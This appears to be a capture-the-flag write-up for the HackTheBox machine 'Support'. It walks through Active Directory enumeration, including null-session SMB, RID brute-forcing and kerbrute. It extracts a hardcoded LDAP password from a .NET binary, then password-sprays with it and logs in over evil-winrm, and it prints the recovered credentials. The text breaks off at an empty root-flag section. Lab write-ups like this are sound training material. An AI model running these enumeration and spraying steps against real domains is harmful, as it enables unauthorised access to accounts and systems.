# Support

# User Flag

## NMAP Enumeration

NMAP Port Scan:

```bash
sudo nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN all-ports-nmap-report 10.10.11.174

# Output
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49676/tcp open  unknown          syn-ack ttl 127
49679/tcp open  unknown          syn-ack ttl 127
49754/tcp open  unknown          syn-ack ttl 127
53009/tcp open  unknown          syn-ack ttl 127
```

NMAP Service Scan:

```bash
nmap -sV -sC -Pn -v -oN nmap-report 10.10.11.174 -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,49676,49679,49754,53009

# Output
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-03 14:36:18Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49679/tcp open  msrpc         Microsoft Windows RPC
49754/tcp open  msrpc         Microsoft Windows RPC
53009/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-06-03T14:37:10
|_  start_date: N/A
```

## SMB Enumeration

The `enum4linux` tool shows null session are enabled:

```bash
enum4linux -A 10.10.11.174

[+] Server 10.10.11.174 allows sessions using username '', password ''
```

Performed NULL attack and enumerated shares:

```bash
smbclient -L //10.10.11.174 -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share
```

Used `smbclient` to access `support-tools` share.

```bash
smbclient //10.10.11.174/support-tools -N

# Output
smb: \> dir
  .                                   D        0  Wed Jul 20 18:01:06 2022
  ..                                  D        0  Sat May 28 12:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 12:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 12:19:55 2022
  putty.exe                           A  1273576  Sat May 28 12:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 12:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 18:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 12:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 12:19:43 2022
```

Used `crackmapexec` to enumerate users.

```bash
crackmapexec smb 10.10.11.174 -u 'guest' -p '' --rid-brute

# Output
SMB         10.10.11.174    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\guest: 
SMB         10.10.11.174    445    DC               [+] Brute forcing RIDs
SMB         10.10.11.174    445    DC               498: SUPPORT\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.174    445    DC               500: SUPPORT\Administrator (SidTypeUser)
SMB         10.10.11.174    445    DC               501: SUPPORT\Guest (SidTypeUser)
SMB         10.10.11.174    445    DC               502: SUPPORT\krbtgt (SidTypeUser)
SMB         10.10.11.174    445    DC               512: SUPPORT\Domain Admins (SidTypeGroup)
SMB         10.10.11.174    445    DC               513: SUPPORT\Domain Users (SidTypeGroup)
SMB         10.10.11.174    445    DC               514: SUPPORT\Domain Guests (SidTypeGroup)
SMB         10.10.11.174    445    DC               515: SUPPORT\Domain Computers (SidTypeGroup)
SMB         10.10.11.174    445    DC               516: SUPPORT\Domain Controllers (SidTypeGroup)
SMB         10.10.11.174    445    DC               517: SUPPORT\Cert Publishers (SidTypeAlias)
SMB         10.10.11.174    445    DC               518: SUPPORT\Schema Admins (SidTypeGroup)
SMB         10.10.11.174    445    DC               519: SUPPORT\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.174    445    DC               520: SUPPORT\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.174    445    DC               521: SUPPORT\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.174    445    DC               522: SUPPORT\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.174    445    DC               525: SUPPORT\Protected Users (SidTypeGroup)
SMB         10.10.11.174    445    DC               526: SUPPORT\Key Admins (SidTypeGroup)
SMB         10.10.11.174    445    DC               527: SUPPORT\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.174    445    DC               553: SUPPORT\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.174    445    DC               571: SUPPORT\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.174    445    DC               572: SUPPORT\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.174    445    DC               1000: SUPPORT\DC$ (SidTypeUser)
SMB         10.10.11.174    445    DC               1101: SUPPORT\DnsAdmins (SidTypeAlias)
SMB         10.10.11.174    445    DC               1102: SUPPORT\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.174    445    DC               1103: SUPPORT\Shared Support Accounts (SidTypeGroup)
SMB         10.10.11.174    445    DC               1104: SUPPORT\ldap (SidTypeUser)
SMB         10.10.11.174    445    DC               1105: SUPPORT\support (SidTypeUser)
SMB         10.10.11.174    445    DC               1106: SUPPORT\smith.rosario (SidTypeUser)
SMB         10.10.11.174    445    DC               1107: SUPPORT\hernandez.stanley (SidTypeUser)
SMB         10.10.11.174    445    DC               1108: SUPPORT\wilson.shelby (SidTypeUser)
SMB         10.10.11.174    445    DC               1109: SUPPORT\anderson.damian (SidTypeUser)
SMB         10.10.11.174    445    DC               1110: SUPPORT\thomas.raphael (SidTypeUser)
SMB         10.10.11.174    445    DC               1111: SUPPORT\levine.leopoldo (SidTypeUser)
SMB         10.10.11.174    445    DC               1112: SUPPORT\raven.clifton (SidTypeUser)
SMB         10.10.11.174    445    DC               1113: SUPPORT\bardot.mary (SidTypeUser)
SMB         10.10.11.174    445    DC               1114: SUPPORT\cromwell.gerard (SidTypeUser)
SMB         10.10.11.174    445    DC               1115: SUPPORT\monroe.david (SidTypeUser)
SMB         10.10.11.174    445    DC               1116: SUPPORT\west.laura (SidTypeUser)
SMB         10.10.11.174    445    DC               1117: SUPPORT\langley.lucy (SidTypeUser)
SMB         10.10.11.174    445    DC               1118: SUPPORT\daughtler.mabel (SidTypeUser)
SMB         10.10.11.174    445    DC               1119: SUPPORT\stoll.rachelle (SidTypeUser)
SMB         10.10.11.174    445    DC               1120: SUPPORT\ford.victoria (SidTypeUser)
SMB         10.10.11.174    445    DC               2601: SUPPORT\MANAGEMENT$ (SidTypeUser)
```



## Keberos

```bash
./kerbrute_linux_amd64 userenum --dc 10.10.11.174 -d support.htb -o /home/kali/Downloads/HackTheBox/Support/kerbrute-user-enum /home/kali/Downloads/HackTheBox/Support/userlist

2024/06/03 16:38:39 >  [+] VALID USERNAME:       ford.victoria@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       stoll.rachelle@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       MANAGEMENT$@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       daughtler.mabel@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       cromwell.gerard@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       monroe.david@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       west.laura@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       bardot.mary@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       langley.lucy@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       raven.clifton@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       levine.leopoldo@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       thomas.raphael@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       support@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       smith.rosario@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       hernandez.stanley@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       wilson.shelby@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       anderson.damian@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       ldap@support.htb
2024/06/03 16:38:39 >  [+] VALID USERNAME:       DC$@support.htb
```

Tried checking for ASREPRoasting but this failed:

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py support.htb/ -dc-ip 10.10.11.174 -usersfile userlist -no-pass -request -outputfile kerberos-users-found
```

## UserInfo.exe - Static & Dynamic Analysis 

Found `UserInfo.exe.zip` on publicly exposed SMB share and copied it to my kali machine. Unzipping the file, I get an executable titled `UserInfo.exe`, which looks to be a .NET application.

```bash
UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```

Copied the file to my FlareVM machine and opened it in `dnSpy` to reverse engineer it. Reviewing the code, I can see that to query User Information, the executable uses the LDAP protocol. 

```cs
public LdapQuery()
{
        string password = Protected.getPassword();
        this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
        this.entry.AuthenticationType = AuthenticationTypes.Secure;
        this.ds = new DirectorySearcher(this.entry);
}
```

To authenticate, the program uses the `getPassword()` function.

```cs
public static string getPassword()
{
	byte[] array = Convert.FromBase64String(Protected.enc_password);
	byte[] array2 = array;
	for (int i = 0; i < array.Length; i++)
	{
		array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
	}
	return Encoding.Default.GetString(array2);
}
```

This `getPassword()` function makes reference to `Protected.enc_password`, a protected varible which contains the encrypted password.

```cs
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
```

The code also makes reference to protected `key` variable:

```cs
private static byte[] key = Encoding.ASCII.GetBytes("armando");
```

Based on the information above, I created a simple python script titled [decrypt_password.py](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Support/Scripts/decrypt_password.py) to decode the encrypted password.

Alertnatively, since the program uses the LDAP protocol which does not use encryption, we can run the code and capture the password in wireshark. I created an entry in my `hosts` file for `support.htb`and spun up Wireshark to list on the tunnel interface (tun0). I provided one of the user I enumertaed earlier as input and executed the binary.

```bash
mono UserInfo.exe user -username smith.rosario@support.htb
```

![Wireshark](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Windows%20Machines/Support/Images/LDAP%20Wireshark.png)

We can see that Wireshark captured the decrypted password `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`.

## LDAP Enumeration

Used kerbrute to perform a password spray attack and returned a successful login for the user `ldap`.

```bash
./kerbrute_linux_amd64 passwordspray --dc 10.10.11.174 -d support.htb /home/kali/Downloads/HackTheBox/Support/userlist 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'

2024/06/08 12:34:23 >  [+] VALID LOGIN:  ldap@support.htb:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

Bloodhound did not return any results of interest, performing ldap enumeration did return a password for the user `support`:

```
# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
....etc.....
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
....etc.....
```

New set of credentials: `support:Ironside47pleasure40Watchful`.

Used `evil-winrm` and got the user flag.

```bash
*Evil-WinRM* PS C:\Users\support\Desktop> dir


    Directory: C:\Users\support\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---          6/8/2024   4:13 AM             34 user.txt
```

# Root Flag

## Bloodhound


















